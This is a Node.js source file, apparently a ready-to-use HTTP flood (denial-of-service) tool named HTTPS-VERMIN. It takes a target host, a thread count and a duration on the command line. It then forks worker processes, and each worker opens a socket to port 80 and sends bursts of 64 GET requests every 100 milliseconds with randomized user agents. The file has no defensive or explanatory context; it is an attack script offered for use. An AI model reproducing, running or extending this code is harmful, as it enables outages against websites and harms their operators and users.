const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');

const TARGET_ARG = 2;
const THREADS_ARG = 3;
const TIME_ARG = 4;
const USER_AGENT_FILE = 'ua.txt';

if (process.argv.length <= 4) {
  console.log("Usage: node HTTPS-VERMIN.js <host> <threads> <time>");
  console.log("Script Made By @vodkanetwork");
  process.exit(-1);
}

const target = process.argv[TARGET_ARG];
const parsed = url.parse(target);
const host = parsed.host;
const threads = parseInt(process.argv[THREADS_ARG]);
const time = parseInt(process.argv[TIME_ARG]);

const nullHexs = ["\x00", "\xFF", "\xC2", "\xA0"];

if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
    console.log(`(•) Total Thread ${i}`);
  }
  console.log(`(✓) Successfully started.`);
  setTimeout(() => {
    process.exit(1);
  }, time * 1000);
} else {
  startFlood();
}

function readUserAgents() {
  try {
    const userAgentData = fs.readFileSync(USER_AGENT_FILE, 'utf8');
    return userAgentData.trim().split('\n');
  } catch (error) {
    console.error("Lỗi Đọc File User-agents:", error.message);
    process.exit(-1);
  }
}

function getRandomUserAgent(userAgents) {
  const randomIndex = Math.floor(Math.random() * userAgents.length);
  return userAgents[randomIndex];
}

function startFlood() {
  const userAgents = readUserAgents();

  const socketOptions = {
    host: host,
    port: 80,
    timeout: 10000,
  };

  const requestData = `GET ${target} HTTP/1.1\r\nHost: ${parsed.host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: ${getRandomUserAgent(userAgents)}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n`;

  const socket = new net.Socket();
  socket.connect(socketOptions);

  let requestCounter = 0;

  const sendRequest = () => {
    for (let i = 0; i < 64; i++) {
      socket.write(requestData);
    }
  };

  socket.on('connect', () => {
    const interval = setInterval(sendRequest, 100);
    setTimeout(() => {
      clearInterval(interval);
      socket.destroy();
    }, time * 1000);
  });

  socket.on('error', (error) => {
    // Handle errors here
  });

  socket.on('data', () => {
    // Process response data if needed
  });
}
